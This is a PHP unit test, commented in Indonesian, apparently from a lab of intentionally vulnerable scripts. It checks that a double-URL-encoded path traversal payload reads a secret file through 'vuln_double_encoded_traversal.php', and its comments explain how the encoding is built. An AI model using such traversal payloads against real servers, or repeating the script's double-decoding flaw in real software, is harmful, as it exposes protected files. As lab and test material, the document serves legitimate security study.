<?php // tests/DoubleEncodedTraversalTest.php

namespace Tests;

class DoubleEncodedTraversalTest extends BaseVulnerableScriptTest
{
    public function testCanAccessSecretFileWithDoubleEncoding()
    {
        $scriptName = 'vuln_double_encoded_traversal.php';
        // Payload untuk '../secret_dir/secret.txt'
        // ../ -> %2e%2e%2f
        // % -> %25
        // Jadi, %252e%252e%252f
        $payload = '%252e%252e%252fsecret_dir%252fsecret.txt';
        $params = ['file' => $payload];

        $output = $this->executeScript($scriptName, $params);

        $this->assertStringContainsString($this->secretContent, $output, "Gagal mengambil konten rahasia menggunakan double encoding.");
        // Verifikasi output dari skrip yang rentan tentang proses decoding
        $this->assertStringContainsString("Singly decoded input (from \$_GET): %2e%2e%2fsecret_dir%2fsecret.txt", $output);
        $this->assertStringContainsString("Doubly decoded input (after script urldecode): ../secret_dir/secret.txt", $output);
    }
}